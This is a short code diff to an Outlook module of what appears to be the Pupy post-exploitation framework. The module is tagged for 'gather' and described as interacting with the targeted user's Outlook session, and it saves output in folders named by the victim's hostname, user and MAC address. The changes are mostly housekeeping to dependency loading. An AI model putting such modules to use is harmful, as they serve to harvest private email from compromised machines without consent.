@@ -1,4 +1,4 @@
-# -*- coding: UTF8 -*-
+# -*- coding: utf-8 -*-
 #Author: @bobsecq
 #Contributor(s):
 
@@ -13,11 +13,11 @@ ROOT=os.path.abspath(os.path.join(os.path.dirname(__file__),"..",".."))
 @config(compat="windows", category="gather")
 class Outlook(PupyModule):
 	""" interact with Outlook session of the targeted user """
-	dependencies=["win32api","win32com","pythoncom","winerror"]
-	
+	dependencies=['outlook', 'win32api','win32com','pythoncom','winerror']
+
 	OL_SAVE_AS_TYPE={'olTXT': 0,'olRTF':1,'olTemplate': 2,'olMSG': 3,'olDoc':4,'olHTML':5,'olVCard': 6,'olVCal':7,'olICal': 8}
 	OL_DEFAULT_FOLDERS = {'olFolderDeletedItems':3,'olFolderDrafts':16,'olFolderInbox':6,'olFolderJunk':23,'olFolderSentMail':5}
-	
+
 	def init_argparse(self):
 		'''
 		'''
@@ -37,7 +37,6 @@ class Outlook(PupyModule):
 	def run(self, args):
 		'''
 		'''
-		self.client.load_package("outlook")
 		localFolder=args.localOutputFolder
 		self.localFolder = os.path.join(localFolder, "{0}-{1}-{2}".format(self.client.desc['hostname'], self.client.desc['user'], self.client.desc['macaddr'].replace(':','')))
 		if not os.path.exists(self.localFolder):
